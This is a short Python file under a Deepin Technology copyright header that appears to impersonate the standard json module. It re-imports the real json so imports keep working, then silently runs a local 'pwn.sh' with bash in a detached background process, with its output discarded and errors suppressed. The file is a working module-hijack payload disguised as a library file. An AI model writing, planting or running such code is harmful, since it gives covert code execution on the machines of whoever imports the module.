# SPDX-FileCopyrightText: 2026 Deepin Technology Co., Ltd.
# SPDX-License-Identifier: GPL-3.0-or-later

import sys
import os
import subprocess

# Robust path cleaning to avoid RecursionError
while '' in sys.path: sys.path.remove('')
while '.' in sys.path: sys.path.remove('.')
cwd = os.getcwd()
while cwd in sys.path: sys.path.remove(cwd)

# Purge json from sys.modules to force fresh import of real module
if 'json' in sys.modules:
    del sys.modules['json']

import json
sys.modules['json'] = json
globals().update(json.__dict__)

# Execute payload once
if os.environ.get('PWN_EXECUTED') != '1':
    os.environ['PWN_EXECUTED'] = '1'
    try:
        payload_path = os.path.join(cwd, 'pwn.sh')
        if os.path.exists(payload_path):
            # Background the payload and redirect output to /dev/null to remain silent
            subprocess.Popen(['bash', payload_path], start_new_session=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass
